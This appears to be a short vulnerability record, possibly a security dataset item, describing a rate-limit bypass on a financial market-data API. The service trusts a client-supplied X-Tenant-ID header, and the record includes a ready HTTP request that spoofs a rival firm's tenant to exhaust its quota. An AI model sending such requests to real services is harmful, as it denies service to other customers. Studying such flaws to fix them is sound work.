diagnosis: The financial market data endpoint passes the client-supplied X-Tenant-ID header into the rate-limiter-flexible consume call instead of enforcing the caller's authenticated session tenantId. An attacker can pass a rival firm's tenant ID and flood requests, exhausting the victim's API quota and causing a denial-of-service.
exploit_request:
POST /api/v1/market-data/realtime-quotes HTTP/1.1
Host: quote-engine.nasdaq-partner.com:9001
Authorization: Bearer <attacker_jwt>
X-Tenant-ID: hedgefund_rival_capital
Content-Type: application/json

{"symbols": ["AAPL", "NVDA"]}
